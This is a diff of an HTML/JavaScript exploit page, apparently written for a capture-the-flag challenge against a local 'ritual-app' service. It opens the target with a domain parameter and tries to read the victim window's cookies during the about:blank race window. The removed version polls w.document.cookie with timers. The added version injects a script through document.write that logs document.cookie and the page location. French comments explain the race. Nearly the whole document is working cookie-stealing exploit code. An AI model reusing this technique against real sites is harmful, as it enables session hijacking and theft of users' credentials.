@@ -5,18 +5,14 @@
     const target = "http://ritual-app:5000/?domain=http://cl0s3witz.github.io";
     const w = window.open(target);
     
-    // Pendant la race window, w.document est encore about:blank
-    // et appartient à notre origine → on peut y accéder !
-    const tries = [1, 2, 3, 5, 7, 10, 15, 20, 30, 50];
-    tries.forEach(ms => {
-        setTimeout(() => {
-            try {
-                w.console.log("COOKIE@" + ms + "ms: " + w.document.cookie);
-            } catch(e) {
-                console.log("ERR@" + ms + "ms: " + e.message);
-            }
-        }, ms);
-    });
+    // Synchrone - pas de setTimeout
+    try {
+        w.document.write('<script>console.log("SYNC: " + document.cookie + " loc:" + location.href)<\/script>');
+        w.document.close();
+        console.log("write OK");
+    } catch(e) {
+        console.log("write ERR: " + e.message);
+    }
 </script>
 </body>
 </html>
